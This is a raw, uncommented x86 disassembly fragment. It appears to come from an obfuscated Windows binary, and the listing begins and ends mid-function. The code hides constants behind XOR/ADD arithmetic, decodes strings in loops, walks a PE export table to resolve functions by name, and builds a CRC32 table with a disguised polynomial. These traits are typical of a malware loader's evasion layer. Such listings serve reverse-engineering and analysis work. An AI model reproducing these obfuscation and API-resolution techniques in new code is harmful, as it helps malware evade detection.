  41f7ad:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41f7b4:	mov    eax,DWORD PTR [ebp+0x10]
  41f7b7:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41f7bd:	push   esi
  41f7be:	push   edi
  41f7bf:	mov    edi,0x751089b
  41f7c4:	xor    eax,edi
  41f7c6:	mov    esi,0x3272e2
  41f7cb:	add    eax,esi
  41f7cd:	cmp    eax,ecx
  41f7cf:	mov    eax,DWORD PTR [ebp-0x4]
  41f7d2:	jne    0x41f7dd
  41f7d4:	xor    eax,edi
  41f7d6:	add    eax,esi
  41f7d8:	jmp    0x41f889
  41f7dd:	mov    ecx,DWORD PTR [ebp+0xc]
  41f7e0:	xor    eax,edi
  41f7e2:	add    eax,esi
  41f7e4:	cmp    eax,ecx
  41f7e6:	jne    0x41f7ed
  41f7e8:	mov    eax,DWORD PTR [ebp-0x4]
  41f7eb:	jmp    0x41f7d4
  41f7ed:	lea    eax,[ebp-0x21c]
  41f7f3:	mov    DWORD PTR [ebp-0x8],eax
  41f7f6:	mov    eax,DWORD PTR [ebp+0xc]
  41f7f9:	mov    DWORD PTR [ebp-0x10],eax
  41f7fc:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ff:	xor    eax,edi
  41f801:	add    eax,esi
  41f803:	mov    DWORD PTR [ebp+0x10],eax
  41f806:	mov    eax,DWORD PTR [ebp+0xc]
  41f809:	push   ebx
  41f80a:	call   0x41f4e5
  41f80f:	mov    ebx,eax
  41f811:	mov    eax,DWORD PTR [ebp+0x8]
  41f814:	mov    eax,DWORD PTR [eax+0x14]
  41f817:	jmp    0x41f871
  41f819:	mov    eax,DWORD PTR [ebp+0xc]
  41f81c:	sub    eax,0x8
  41f81f:	mov    DWORD PTR [ebp-0xc],eax
  41f822:	mov    eax,DWORD PTR [ebp-0xc]
  41f825:	mov    eax,DWORD PTR [eax+0x28]
  41f828:	call   0x41f3cd
  41f82d:	mov    DWORD PTR [ebp+0x10],eax
  41f830:	push   DWORD PTR [ebp+0x10]
  41f833:	mov    edx,DWORD PTR [ebp-0x8]
  41f836:	call   0x41f574
  41f83b:	mov    eax,DWORD PTR [ebp-0x4]
  41f83e:	xor    eax,edi
  41f840:	add    eax,esi
  41f842:	cmp    eax,ebx
  41f844:	jne    0x41f84e
  41f846:	mov    eax,DWORD PTR [ebp-0x8]
  41f849:	call   0x41f45b
  41f84e:	mov    eax,DWORD PTR [ebp-0x14]
  41f851:	xor    eax,edi
  41f853:	add    eax,esi
  41f855:	push   eax
  41f856:	push   DWORD PTR [ebp-0x10]
  41f859:	mov    eax,DWORD PTR [ebp-0x8]
  41f85c:	call   0x41f187
  41f861:	mov    ecx,DWORD PTR [ebp-0x4]
  41f864:	xor    ecx,edi
  41f866:	add    ecx,esi
  41f868:	cmp    eax,ecx
  41f86a:	je     0x41f88f
  41f86c:	mov    eax,DWORD PTR [ebp+0xc]
  41f86f:	mov    eax,DWORD PTR [eax]
  41f871:	mov    DWORD PTR [ebp+0xc],eax
  41f874:	mov    eax,DWORD PTR [ebp+0x8]
  41f877:	mov    ecx,DWORD PTR [ebp+0xc]
  41f87a:	add    eax,0x14
  41f87d:	cmp    ecx,eax
  41f87f:	jne    0x41f819
  41f881:	mov    eax,DWORD PTR [ebp-0x4]
  41f884:	xor    eax,edi
  41f886:	add    eax,esi
  41f888:	pop    ebx
  41f889:	pop    edi
  41f88a:	pop    esi
  41f88b:	leave  
  41f88c:	ret    0xc
  41f88f:	mov    eax,DWORD PTR [ebp-0xc]
  41f892:	mov    eax,DWORD PTR [eax+0x18]
  41f895:	jmp    0x41f888
  41f897:	push   ebp
  41f898:	mov    ebp,esp
  41f89a:	mov    eax,DWORD PTR [ebp+0xc]
  41f89d:	sub    esp,0x10
  41f8a0:	cmp    DWORD PTR [ebp+0x8],0x0
  41f8a4:	push   ebx
  41f8a5:	push   esi
  41f8a6:	push   edi
  41f8a7:	je     0x41f95c
  41f8ad:	test   eax,eax
  41f8af:	je     0x41f95c
  41f8b5:	movzx  eax,WORD PTR [eax+0x20]
  41f8b9:	mov    ecx,eax
  41f8bb:	mov    DWORD PTR [ebp-0x10],eax
  41f8be:	xor    edx,edx
  41f8c0:	and    DWORD PTR [ebp-0x8],edx
  41f8c3:	mov    eax,0x8a8d
  41f8c8:	xor    ecx,eax
  41f8ca:	add    ecx,0x3b51
  41f8d0:	mov    DWORD PTR [ebp-0xc],ecx
  41f8d3:	and    DWORD PTR [ebp-0x4],0x0
  41f8d7:	xor    ecx,ecx
  41f8d9:	push   0x7e
  41f8db:	pop    edi
  41f8dc:	cmp    cx,WORD PTR [ebp-0xc]
  41f8e0:	jae    0x41f946
  41f8e2:	lea    esi,[edx-0x3b51]
  41f8e8:	xor    esi,eax
  41f8ea:	movzx  ecx,WORD PTR [ebp-0x4]
  41f8ee:	mov    ebx,DWORD PTR [ebp+0xc]
  41f8f1:	lea    ecx,[ebx+ecx*4]
  41f8f4:	cmp    WORD PTR [ecx+0x2],si
  41f8f8:	jne    0x41f931
  41f8fa:	movzx  ecx,WORD PTR [ecx]
  41f8fd:	mov    edi,0x4e22
  41f902:	cmp    cx,di
  41f905:	jne    0x41f913
  41f907:	mov    ebx,DWORD PTR [ebp+0x8]
  41f90a:	movzx  edi,dx
  41f90d:	cmp    BYTE PTR [edi+ebx*1],0x0
  41f911:	je     0x41f940
  41f913:	mov    ebx,DWORD PTR [ebp+0x8]
  41f916:	movzx  edi,dx
  41f919:	movsx  di,BYTE PTR [edi+ebx*1]
  41f91e:	mov    ebx,0x3b51
  41f923:	sub    di,bx
  41f926:	xor    di,ax
  41f929:	cmp    cx,di
  41f92c:	je     0x41f940
  41f92e:	push   0x7c
  41f930:	pop    edi
  41f931:	inc    DWORD PTR [ebp-0x4]
  41f934:	mov    cx,WORD PTR [ebp-0xc]
  41f938:	cmp    WORD PTR [ebp-0x4],cx
  41f93c:	jb     0x41f8ea
  41f93e:	jmp    0x41f946
  41f940:	inc    DWORD PTR [ebp-0x8]
  41f943:	push   0x7d
  41f945:	pop    edi
  41f946:	mov    esi,DWORD PTR [ebp+0x8]
  41f949:	movzx  ecx,dx
  41f94c:	cmp    BYTE PTR [ecx+esi*1],0x0
  41f950:	je     0x41f965
  41f952:	inc    edx
  41f953:	cmp    edi,0x7c
  41f956:	jne    0x41f8d3
  41f95c:	xor    eax,eax
  41f95e:	pop    edi
  41f95f:	pop    esi
  41f960:	pop    ebx
  41f961:	leave  
  41f962:	ret    0x8
  41f965:	mov    ecx,DWORD PTR [ebp-0x8]
  41f968:	add    ecx,0xffffc4af
  41f96e:	xor    cx,ax
  41f971:	xor    eax,eax
  41f973:	cmp    cx,WORD PTR [ebp-0x10]
  41f977:	sete   al
  41f97a:	jmp    0x41f95e
  41f97c:	push   ebp
  41f97d:	mov    ebp,esp
  41f97f:	sub    esp,0x50
  41f982:	push   edi
  41f983:	mov    edi,eax
  41f985:	mov    eax,DWORD PTR [edi+0x1a8]
  41f98b:	cmp    DWORD PTR [eax],0x0
  41f98e:	jne    0x41f997
  41f990:	xor    eax,eax
  41f992:	jmp    0x41fac8
  41f997:	push   DWORD PTR [ebp+0x8]
  41f99a:	push   0x2c
  41f99c:	pop    eax
  41f99d:	call   0x41f72c
  41f9a2:	mov    edx,DWORD PTR [edi+0x1ac]
  41f9a8:	lea    eax,[edi+0x22]
  41f9ab:	mov    DWORD PTR [ebp-0x4c],eax
  41f9ae:	lea    eax,[edi+0x44]
  41f9b1:	mov    DWORD PTR [ebp-0x48],eax
  41f9b4:	lea    eax,[edi+0x66]
  41f9b7:	mov    DWORD PTR [ebp-0x44],eax
  41f9ba:	lea    eax,[edi+0x88]
  41f9c0:	mov    DWORD PTR [ebp-0x40],eax
  41f9c3:	lea    eax,[edi+0xaa]
  41f9c9:	mov    DWORD PTR [ebp-0x3c],eax
  41f9cc:	lea    eax,[edi+0xcc]
  41f9d2:	mov    DWORD PTR [ebp-0x38],eax
  41f9d5:	lea    eax,[edi+0xee]
  41f9db:	mov    DWORD PTR [ebp-0x34],eax
  41f9de:	lea    eax,[edi+0x110]
  41f9e4:	mov    DWORD PTR [ebp-0x30],eax
  41f9e7:	lea    eax,[edi+0x132]
  41f9ed:	mov    DWORD PTR [ebp-0x2c],eax
  41f9f0:	lea    eax,[edi+0x154]
  41f9f6:	push   edi
  41f9f7:	mov    DWORD PTR [ebp-0x50],edi
  41f9fa:	mov    DWORD PTR [ebp-0x28],eax
  41f9fd:	call   0x41fafc
  41fa02:	push   eax
  41fa03:	mov    eax,DWORD PTR [edi+0x1a8]
  41fa09:	push   DWORD PTR [eax]
  41fa0b:	call   0x41f79d
  41fa10:	mov    DWORD PTR [ebp-0x10],eax
  41fa13:	test   eax,eax
  41fa15:	je     0x41fac8
  41fa1b:	mov    ecx,DWORD PTR [eax+0x3c]
  41fa1e:	push   ebx
  41fa1f:	push   esi
  41fa20:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41fa24:	add    esi,eax
  41fa26:	mov    edi,DWORD PTR [esi+0x24]
  41fa29:	mov    ecx,DWORD PTR [esi+0x1c]
  41fa2c:	mov    edx,DWORD PTR [esi+0x20]
  41fa2f:	mov    ebx,DWORD PTR [esi+0x18]
  41fa32:	add    edi,eax
  41fa34:	mov    DWORD PTR [ebp-0x20],edi
  41fa37:	mov    edi,DWORD PTR [esi+0x14]
  41fa3a:	add    ecx,eax
  41fa3c:	add    edx,eax
  41fa3e:	mov    DWORD PTR [ebp-0xc],ecx
  41fa41:	mov    DWORD PTR [ebp-0x1c],edx
  41fa44:	mov    DWORD PTR [ebp-0x8],edi
  41fa47:	cmp    edi,ebx
  41fa49:	ja     0x41fa4e
  41fa4b:	mov    DWORD PTR [ebp-0x8],ebx
  41fa4e:	xor    ebx,ebx
  41fa50:	mov    DWORD PTR [ebp-0x18],ebx
  41fa53:	cmp    DWORD PTR [ebp-0x8],ebx
  41fa56:	jbe    0x41fac6
  41fa58:	jmp    0x41fa5d
  41fa5a:	mov    edx,DWORD PTR [ebp-0x1c]
  41fa5d:	mov    edi,DWORD PTR [ebp-0x20]
  41fa60:	movzx  edi,WORD PTR [edi+ebx*2]
  41fa64:	cmp    ebx,DWORD PTR [esi+0x18]
  41fa67:	jae    0x41fac6
  41fa69:	cmp    edi,DWORD PTR [esi+0x14]
  41fa6c:	jae    0x41fac6
  41fa6e:	mov    ebx,DWORD PTR [edx+ebx*4]
  41fa71:	mov    edx,DWORD PTR [ebp+0x8]
  41fa74:	mov    edi,DWORD PTR [ecx+edi*4]
  41fa77:	mov    DWORD PTR [ebp-0x4],edx
  41fa7a:	lea    edx,[ebp-0x50]
  41fa7d:	add    ebx,eax
  41fa7f:	add    edi,eax
  41fa81:	sub    edx,DWORD PTR [ebp+0x8]
  41fa84:	mov    DWORD PTR [ebp-0x14],0xb
  41fa8b:	mov    DWORD PTR [ebp-0x24],edx
  41fa8e:	mov    edx,DWORD PTR [ebp-0x4]
  41fa91:	cmp    DWORD PTR [edx],0x0
  41fa94:	jne    0x41fab1
  41fa96:	mov    eax,DWORD PTR [ebp-0x24]
  41fa99:	push   DWORD PTR [eax+edx*1]
  41fa9c:	push   ebx
  41fa9d:	call   0x41f897
  41faa2:	mov    ecx,DWORD PTR [ebp-0xc]
  41faa5:	test   eax,eax
  41faa7:	je     0x41faae
  41faa9:	mov    eax,DWORD PTR [ebp-0x4]
  41faac:	mov    DWORD PTR [eax],edi
  41faae:	mov    eax,DWORD PTR [ebp-0x10]
  41fab1:	add    DWORD PTR [ebp-0x4],0x4
  41fab5:	dec    DWORD PTR [ebp-0x14]
  41fab8:	jne    0x41fa8e
  41faba:	mov    ebx,DWORD PTR [ebp-0x18]
  41fabd:	inc    ebx
  41fabe:	mov    DWORD PTR [ebp-0x18],ebx
  41fac1:	cmp    ebx,DWORD PTR [ebp-0x8]
  41fac4:	jb     0x41fa5a
  41fac6:	pop    esi
  41fac7:	pop    ebx
  41fac8:	pop    edi
  41fac9:	leave  
  41faca:	ret    0x4
  41facd:	push   ebp
  41face:	mov    ebp,esp
  41fad0:	mov    eax,DWORD PTR [ebp+0x8]
  41fad3:	push   esi
  41fad4:	push   DWORD PTR [eax+0x1d8]
  41fada:	lea    esi,[eax+0x198]
  41fae0:	mov    eax,DWORD PTR [ebp+0x8]
  41fae3:	call   0x41f97c
  41fae8:	mov    ecx,DWORD PTR [esi]
  41faea:	mov    DWORD PTR [ecx],eax
  41faec:	mov    eax,DWORD PTR [esi]
  41faee:	xor    ecx,ecx
  41faf0:	cmp    DWORD PTR [eax],ecx
  41faf2:	pop    esi
  41faf3:	setne  cl
  41faf6:	mov    eax,ecx
  41faf8:	pop    ebp
  41faf9:	ret    0x4
  41fafc:	mov    ecx,DWORD PTR [edi+0x188]
  41fb02:	push   ebx
  41fb03:	jmp    0x41fb18
  41fb05:	xor    eax,0x8a8d
  41fb0a:	add    eax,0x3b51
  41fb0f:	mov    WORD PTR [ecx],ax
  41fb12:	add    ecx,0x2
  41fb15:	add    edx,0x2
  41fb18:	movzx  eax,WORD PTR [edx]
  41fb1b:	mov    ebx,0x4e22
  41fb20:	cmp    ax,bx
  41fb23:	jne    0x41fb05
  41fb25:	xor    eax,eax
  41fb27:	mov    WORD PTR [ecx],ax
  41fb2a:	mov    eax,DWORD PTR [edi+0x188]
  41fb30:	pop    ebx
  41fb31:	ret    
  41fb32:	push   edi
  41fb33:	mov    edi,eax
  41fb35:	mov    eax,DWORD PTR [esi+0x188]
  41fb3b:	shl    edi,0x6
  41fb3e:	add    eax,edi
  41fb40:	jmp    0x41fb4c
  41fb42:	xor    cl,0x74
  41fb45:	sub    cl,0x8
  41fb48:	mov    BYTE PTR [eax],cl
  41fb4a:	inc    eax
  41fb4b:	inc    edx
  41fb4c:	mov    cl,BYTE PTR [edx]
  41fb4e:	cmp    cl,0x7c
  41fb51:	jne    0x41fb42
  41fb53:	mov    BYTE PTR [eax],0x0
  41fb56:	mov    eax,DWORD PTR [esi+0x188]
  41fb5c:	add    eax,edi
  41fb5e:	pop    edi
  41fb5f:	ret    
  41fb60:	push   ebp
  41fb61:	mov    ebp,esp
  41fb63:	sub    esp,0x38
  41fb66:	push   ebx
  41fb67:	mov    ebx,0xf89c8585
  41fb6c:	mov    DWORD PTR [ebp-0x4],ebx
  41fb6f:	lea    eax,[ebx-0x1]
  41fb72:	push   esi
  41fb73:	mov    DWORD PTR [ebp-0x24],eax
  41fb76:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb79:	mov    edx,DWORD PTR [ebp+0x8]
  41fb7c:	mov    esi,0x751089b
  41fb81:	push   edi
  41fb82:	xor    ecx,esi
  41fb84:	mov    edi,0x3272e2
  41fb89:	add    ecx,edi
  41fb8b:	cmp    edx,ecx
  41fb8d:	je     0x41fcfb
  41fb93:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb96:	mov    edx,DWORD PTR [ebp+0xc]
  41fb99:	xor    ecx,esi
  41fb9b:	add    ecx,edi
  41fb9d:	cmp    edx,ecx
  41fb9f:	je     0x41fcfb
  41fba5:	mov    ecx,DWORD PTR [ebp+0x10]
  41fba8:	mov    DWORD PTR [ebp-0x18],ecx
  41fbab:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbae:	mov    DWORD PTR [ebp-0x14],ecx
  41fbb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbb4:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  41fbbb:	mov    DWORD PTR [ebp-0x20],eax
  41fbbe:	mov    DWORD PTR [ebp-0x10],ebx
  41fbc1:	mov    DWORD PTR [ebp+0xc],eax
  41fbc4:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41fbcb:	mov    eax,DWORD PTR [ebp+0xc]
  41fbce:	mov    DWORD PTR [ebp-0xc],ecx
  41fbd1:	xor    eax,esi
  41fbd3:	mov    ecx,0xffcd8d1e
  41fbd8:	sub    ecx,eax
  41fbda:	add    ecx,DWORD PTR [ebp-0x14]
  41fbdd:	mov    DWORD PTR [ebp+0x8],ecx
  41fbe0:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41fbe7:	jmp    0x41fceb
  41fbec:	mov    eax,DWORD PTR [ebp+0xc]
  41fbef:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbf2:	xor    eax,esi
  41fbf4:	xor    ecx,esi
  41fbf6:	lea    ecx,[eax+ecx*1+0x64e5c4]
  41fbfd:	mov    eax,DWORD PTR [ebp+0x8]
  41fc00:	xor    edx,edx
  41fc02:	div    ecx
  41fc04:	mov    eax,DWORD PTR [ebp+0x10]
  41fc07:	mov    ecx,DWORD PTR [ebp+0xc]
  41fc0a:	xor    eax,esi
  41fc0c:	xor    ecx,esi
  41fc0e:	sub    eax,ecx
  41fc10:	cmp    edx,eax
  41fc12:	jne    0x41fca7
  41fc18:	mov    eax,DWORD PTR [ebp+0x8]
  41fc1b:	add    eax,DWORD PTR [ebp-0xc]
  41fc1e:	mov    dl,BYTE PTR [eax]
  41fc20:	mov    eax,DWORD PTR [ebp-0x10]
  41fc23:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc26:	xor    eax,esi
  41fc28:	xor    ecx,esi
  41fc2a:	add    eax,edi
  41fc2c:	add    ecx,edi
  41fc2e:	cmp    eax,ecx
  41fc30:	jae    0x41fc78
  41fc32:	lea    ecx,[eax-0x3272e2]
  41fc38:	mov    DWORD PTR [ebp-0x4],ecx
  41fc3b:	mov    ebx,DWORD PTR [ebp-0x4]
  41fc3e:	xor    ebx,esi
  41fc40:	add    ebx,0x7f55d8fb
  41fc46:	lea    ecx,[ebp+eax*4-0x38]
  41fc4a:	mov    DWORD PTR [ecx],ebx
  41fc4c:	mov    ebx,DWORD PTR [ecx]
  41fc4e:	cmp    ebx,0x244ecbda
  41fc54:	jbe    0x41fc5e
  41fc56:	add    DWORD PTR [ecx],0x405fc19
  41fc5c:	jmp    0x41fc64
  41fc5e:	add    DWORD PTR [ecx],0xfdaf43e7
  41fc64:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc67:	xor    ecx,esi
  41fc69:	inc    eax
  41fc6a:	inc    DWORD PTR [ebp-0x4]
  41fc6d:	add    ecx,edi
  41fc6f:	cmp    eax,ecx
  41fc71:	jb     0x41fc3b
  41fc73:	mov    ebx,0xf89c8585
  41fc78:	mov    eax,DWORD PTR [ebp-0x18]
  41fc7b:	test   eax,eax
  41fc7d:	jne    0x41fc87
  41fc7f:	xor    dl,0x74
  41fc82:	sub    dl,0x8
  41fc85:	jmp    0x41fc9d
  41fc87:	mov    eax,DWORD PTR [ebp-0x1c]
  41fc8a:	xor    al,0x9b
  41fc8c:	mov    cl,0x1e
  41fc8e:	sub    cl,al
  41fc90:	add    dl,cl
  41fc92:	mov    ecx,DWORD PTR [ebp-0x20]
  41fc95:	xor    cl,0x9b
  41fc98:	sub    cl,0x1e
  41fc9b:	ror    dl,cl
  41fc9d:	xor    eax,eax
  41fc9f:	mov    eax,DWORD PTR [ebp+0x8]
  41fca2:	add    eax,DWORD PTR [ebp-0xc]
  41fca5:	mov    BYTE PTR [eax],dl
  41fca7:	mov    eax,DWORD PTR [ebp+0x8]
  41fcaa:	mov    ecx,DWORD PTR [ebp-0x10]
  41fcad:	sub    eax,edi
  41fcaf:	xor    eax,esi
  41fcb1:	cmp    eax,ecx
  41fcb3:	jne    0x41fcd9
  41fcb5:	mov    eax,DWORD PTR [ebp+0x10]
  41fcb8:	mov    ecx,DWORD PTR [ebp+0xc]
  41fcbb:	xor    eax,esi
  41fcbd:	xor    ecx,esi
  41fcbf:	sub    eax,ecx
  41fcc1:	sub    eax,edi
  41fcc3:	xor    eax,esi
  41fcc5:	mov    DWORD PTR [ebp+0x10],eax
  41fcc8:	mov    eax,DWORD PTR [ebp+0xc]
  41fccb:	xor    eax,esi
  41fccd:	mov    ecx,0xffcd8d1e
  41fcd2:	sub    ecx,eax
  41fcd4:	add    ecx,DWORD PTR [ebp-0x14]
  41fcd7:	jmp    0x41fce8
  41fcd9:	mov    eax,DWORD PTR [ebp+0xc]
  41fcdc:	xor    eax,esi
  41fcde:	mov    ecx,0xffcd8d1e
  41fce3:	sub    ecx,eax
  41fce5:	add    ecx,DWORD PTR [ebp+0x8]
  41fce8:	mov    DWORD PTR [ebp+0x8],ecx
  41fceb:	mov    eax,DWORD PTR [ebp+0x10]
  41fcee:	cmp    eax,ebx
  41fcf0:	jne    0x41fbec
  41fcf6:	mov    eax,DWORD PTR [ebp-0x24]
  41fcf9:	jmp    0x41fcfe
  41fcfb:	mov    eax,DWORD PTR [ebp-0x4]
  41fcfe:	xor    eax,esi
  41fd00:	add    eax,edi
  41fd02:	pop    edi
  41fd03:	pop    esi
  41fd04:	pop    ebx
  41fd05:	leave  
  41fd06:	ret    0xc
  41fd09:	push   ebp
  41fd0a:	mov    ebp,esp
  41fd0c:	sub    esp,0x14
  41fd0f:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41fd16:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  41fd1d:	mov    eax,DWORD PTR [ebx]
  41fd1f:	mov    DWORD PTR [ebp-0x8],eax
  41fd22:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41fd29:	push   esi
  41fd2a:	push   edi
  41fd2b:	mov    DWORD PTR [ebp-0x14],0xead718a5
  41fd32:	mov    edi,DWORD PTR [ebp-0x4]
  41fd35:	mov    ecx,DWORD PTR [ebp-0x10]
  41fd38:	mov    eax,0x751089b
  41fd3d:	xor    edi,eax
  41fd3f:	mov    edx,0x3272e2
  41fd44:	xor    ecx,eax
  41fd46:	add    edi,edx
  41fd48:	add    ecx,edx
  41fd4a:	imul   edi,ecx
  41fd4d:	jmp    0x41fd95
  41fd4f:	mov    ecx,DWORD PTR [ebp-0x8]
  41fd52:	mov    esi,DWORD PTR [ebp-0x4]
  41fd55:	xor    ecx,eax
  41fd57:	xor    esi,eax
  41fd59:	add    ecx,edx
  41fd5b:	add    esi,edx
  41fd5d:	test   esi,ecx
  41fd5f:	mov    esi,DWORD PTR [ebp-0x8]
  41fd62:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd65:	je     0x41fd7c
  41fd67:	xor    ecx,eax
  41fd69:	xor    esi,eax
  41fd6b:	add    ecx,edx
  41fd6d:	add    esi,edx
  41fd6f:	shr    esi,cl
  41fd71:	mov    ecx,DWORD PTR [ebp-0x14]
  41fd74:	xor    ecx,eax
  41fd76:	add    ecx,edx
  41fd78:	xor    esi,ecx
  41fd7a:	jmp    0x41fd86
  41fd7c:	xor    esi,eax
  41fd7e:	xor    ecx,eax
  41fd80:	add    esi,edx
  41fd82:	add    ecx,edx
  41fd84:	shr    esi,cl
  41fd86:	mov    DWORD PTR [ebp-0x8],esi
  41fd89:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd8c:	xor    ecx,eax
  41fd8e:	lea    edi,[edi+ecx*1+0x3272e2]
  41fd95:	mov    ecx,DWORD PTR [ebp-0xc]
  41fd98:	mov    esi,DWORD PTR [ebp-0x4]
  41fd9b:	xor    esi,eax
  41fd9d:	xor    ecx,eax
  41fd9f:	sub    ecx,esi
  41fda1:	cmp    edi,ecx
  41fda3:	jbe    0x41fd4f
  41fda5:	mov    eax,DWORD PTR [ebp-0x8]
  41fda8:	pop    edi
  41fda9:	mov    DWORD PTR [ebx],eax
  41fdab:	mov    eax,DWORD PTR [ebp-0x8]
  41fdae:	pop    esi
  41fdaf:	leave  
  41fdb0:	ret    
  41fdb1:	push   ebp
  41fdb2:	mov    ebp,esp
  41fdb4:	sub    esp,0x420
  41fdba:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41fdc1:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41fdc8:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  41fdcf:	push   ebx
  41fdd0:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41fdd7:	mov    eax,DWORD PTR [ebp-0x14]
  41fdda:	push   esi
  41fddb:	mov    esi,0x751089b
  41fde0:	push   edi
  41fde1:	xor    eax,esi
  41fde3:	mov    edi,0x3272e2
  41fde8:	add    eax,edi
  41fdea:	mov    DWORD PTR [ebp-0x8],eax
  41fded:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41fdf4:	mov    DWORD PTR [ebp-0x4],0xead718a5
  41fdfb:	mov    DWORD PTR [ebp-0x10],0x8
  41fe02:	mov    ecx,ecx
  41fe04:	mov    eax,DWORD PTR [ebp-0xc]
  41fe07:	mov    ecx,DWORD PTR [ebp-0x14]
  41fe0a:	xor    eax,esi
  41fe0c:	xor    ecx,esi
  41fe0e:	add    eax,edi
  41fe10:	add    ecx,edi
  41fe12:	imul   eax,ecx
  41fe15:	jmp    0x41fe48
  41fe17:	mov    eax,DWORD PTR [ebp-0x4]
  41fe1a:	sub    eax,edi
  41fe1c:	xor    eax,esi
  41fe1e:	mov    DWORD PTR [ebp-0x8],eax
  41fe21:	lea    ebx,[ebp-0x8]
  41fe24:	call   0x41fd09
  41fe29:	mov    DWORD PTR [ebp-0x8],eax
  41fe2c:	mov    eax,DWORD PTR [ebp-0x8]
  41fe2f:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe32:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41fe39:	mov    eax,DWORD PTR [ebp-0xc]
  41fe3c:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe3f:	xor    eax,esi
  41fe41:	lea    eax,[eax+ecx*1+0x3272e2]
  41fe48:	mov    DWORD PTR [ebp-0x4],eax
  41fe4b:	mov    eax,DWORD PTR [ebp-0x18]
  41fe4e:	mov    ecx,DWORD PTR [ebp-0xc]
  41fe51:	xor    ecx,esi
  41fe53:	xor    eax,esi
  41fe55:	sub    eax,ecx
  41fe57:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe5a:	cmp    ecx,eax
  41fe5c:	jbe    0x41fe17
  41fe5e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fe61:	xor    eax,esi
  41fe63:	add    eax,edi
  41fe65:	mov    DWORD PTR [ebp-0x8],eax
  41fe68:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41fe6f:	mov    ebx,ebx
  41fe71:	jmp    0x41fed4
  41fe73:	mov    ecx,DWORD PTR [ebp-0x20]
  41fe76:	mov    eax,DWORD PTR [ebp-0x8]
  41fe79:	xor    ecx,esi
  41fe7b:	add    ecx,edi
  41fe7d:	shr    eax,cl
  41fe7f:	mov    DWORD PTR [ebp-0x4],eax
  41fe82:	mov    eax,DWORD PTR [ebp+0x8]
  41fe85:	mov    cl,BYTE PTR [eax]
  41fe87:	mov    BYTE PTR [ebp+0xb],cl
  41fe8a:	mov    cl,BYTE PTR [ebp+0xb]
  41fe8d:	mov    edx,DWORD PTR [ebp-0x8]
  41fe90:	movzx  ecx,cl
  41fe93:	xor    ecx,edx
  41fe95:	mov    DWORD PTR [ebp+0x8],ecx
  41fe98:	mov    ecx,DWORD PTR [ebp-0x18]
  41fe9b:	mov    edx,DWORD PTR [ebp+0x8]
  41fe9e:	xor    ecx,esi
  41fea0:	add    ecx,edi
  41fea2:	and    ecx,edx
  41fea4:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41feab:	mov    edx,DWORD PTR [ebp-0x4]
  41feae:	xor    ecx,edx
  41feb0:	mov    DWORD PTR [ebp-0x8],ecx
  41feb3:	mov    ecx,DWORD PTR [ebp-0xc]
  41feb6:	xor    ecx,esi
  41feb8:	lea    eax,[eax+ecx*1+0x3272e2]
  41febf:	mov    DWORD PTR [ebp+0x8],eax
  41fec2:	mov    eax,DWORD PTR [ebp-0xc]
  41fec5:	xor    eax,esi
  41fec7:	mov    ecx,0xffcd8d1e
  41fecc:	sub    ecx,eax
  41fece:	add    ecx,DWORD PTR [ebp-0x10]
  41fed1:	mov    DWORD PTR [ebp-0x10],ecx
  41fed4:	mov    eax,DWORD PTR [ebp-0x14]
  41fed7:	mov    ecx,DWORD PTR [ebp-0x10]
  41feda:	xor    eax,esi
  41fedc:	add    eax,edi
  41fede:	cmp    ecx,eax
  41fee0:	jne    0x41fe73
  41fee2:	mov    eax,DWORD PTR [ebp-0x1c]
  41fee5:	mov    ecx,DWORD PTR [ebp-0x8]
  41fee8:	xor    eax,esi
  41feea:	add    eax,edi
  41feec:	pop    edi
  41feed:	pop    esi
  41feee:	xor    eax,ecx
  41fef0:	pop    ebx
  41fef1:	leave  
  41fef2:	ret    0x4
  41fef5:	push   ebp
  41fef6:	mov    ebp,esp
  41fef8:	mov    eax,DWORD PTR [ebp+0x1c]
  41fefb:	mov    ecx,DWORD PTR [ebp+0x8]
  41fefe:	mov    edx,DWORD PTR [ebp+0x10]
  41ff01:	mov    eax,DWORD PTR [eax+0x190]
  41ff07:	mov    eax,DWORD PTR [eax]
  41ff09:	sub    esp,0x64
  41ff0c:	push   ebx
  41ff0d:	push   esi
  41ff0e:	push   edi
  41ff0f:	mov    edi,0x751089b
  41ff14:	xor    ecx,edi
  41ff16:	mov    ebx,0x3272e2
  41ff1b:	add    ecx,ebx
  41ff1d:	cmp    ecx,edx
  41ff1f:	jne    0x41ff30
  41ff21:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ff2b:	jmp    0x42042c
  41ff30:	mov    ecx,DWORD PTR [ebp+0x8]
  41ff33:	mov    esi,DWORD PTR [ebp+0x14]
  41ff36:	mov    edx,DWORD PTR [esi]
  41ff38:	xor    ecx,edi
  41ff3a:	add    ecx,ebx
  41ff3c:	cmp    edx,ecx
  41ff3e:	je     0x4203e7
  41ff44:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff47:	mov    DWORD PTR [ebp-0x1c],eax
